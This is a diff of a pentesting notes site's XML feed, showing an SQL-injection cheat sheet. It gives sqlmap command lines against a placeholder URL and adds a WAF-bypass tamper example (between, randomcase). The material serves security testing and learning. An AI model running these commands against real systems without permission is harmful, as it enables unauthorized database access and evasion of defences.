@@ -320,7 +320,8 @@ Tools #   HTTP Request Smuggler, Burp extension  # https://github.com/defparam/s
       
       <guid>https://caon.io/docs/exploitation/sqli/</guid>
       <description>SQLi #  sqlmap #   https://github.com/sqlmapproject/sqlmap  # request in txt sqlmap -r search-test.txt -p parameter # post sqlmap -o -u &amp;quot;http://example.com/index.php?id=1&amp;quot; --data=&amp;quot;username=admin&amp;amp;password=pass&amp;amp;submit=+Login+&amp;quot; --method=POST # get sqlmap -u &amp;quot;http://example.com/index.php?id=1&amp;quot; # with point of injection (*) sqlmap -u &amp;quot;http://example.com/index.php?id=1*-133&amp;amp;debug=true&amp;quot; # risk sqlmap -u &amp;quot;http://example.com/index.php?id=1&amp;quot; --risk=3 --level=5 Temper #  The ability to create payloads that can bypass waf
- https://github.com/m4ll0k/Atlas  Articles #     URL     https://www.</description>
+ https://github.com/m4ll0k/Atlas  Example:
+--tamper=&amp;quot;between,randomcase&amp;quot; Articles #     URL     https://www.</description>
     </item>
     
     <item>
